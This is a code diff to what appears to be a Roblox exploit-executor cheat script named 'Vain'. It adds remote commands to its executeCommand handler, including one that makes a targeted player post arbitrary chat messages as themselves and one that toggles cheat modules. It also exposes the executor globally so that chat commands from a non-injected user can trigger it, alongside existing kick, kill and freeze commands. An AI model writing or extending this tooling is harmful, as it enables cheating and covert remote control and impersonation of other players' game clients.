@@ -365,6 +365,38 @@ local function executeCommand(command, args)
 
 	if command == 'kick' then
 		lp:Kick('[Vain] You have been kicked.')
+	elseif command == 'rejoin' then
+		pcall(function()
+			game:GetService('TeleportService'):Teleport(game.PlaceId, lp)
+		end)
+	elseif command == 'toggle' then
+		-- args = module (or option) name; flip it if it exists. Modules live in
+		-- category.Buttons, toggles/options in category.Options.
+		if vain and type(args) == 'string' and args ~= '' then
+			pcall(function()
+				for _, cat in vain.Categories do
+					local opt = (cat.Buttons and cat.Buttons[args]) or (cat.Options and cat.Options[args])
+					if opt and opt.Toggle then opt:Toggle() return end
+				end
+			end)
+		end
+	elseif command == 'chat' then
+		-- make the target say args in chat
+		if type(args) == 'string' and args ~= '' then
+			task.spawn(function()
+				local tcs = game:GetService('TextChatService')
+				local rs  = game:GetService('ReplicatedStorage')
+				pcall(function()
+					if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+						local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
+						         or tcs.ChatInputBarConfiguration.TargetTextChannel
+						if ch then ch:SendAsync(args) end
+					else
+						rs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(args, 'All')
+					end
+				end)
+			end)
+		end
 	elseif command == 'kill' then
 		if hum then hum.Health = 0 end
 	elseif command == 'freeze' then
@@ -442,6 +474,14 @@ local function executeCommand(command, args)
 			end
 		end)
 	end
+end
+
+-- Expose the local executor so the in-game chat receiver (universal.lua) can run
+-- an authorised ;command typed by a NON-injected user directly, without the API
+-- relay. Authorisation for that path is enforced on the receiver side there.
+getgenv().vainExecuteCommand = function(command, args)
+	if type(command) ~= 'string' then return end
+	pcall(executeCommand, command:lower(), args)
 end
 
 -- Long-poll: the server holds the connection open up to 25s and responds the
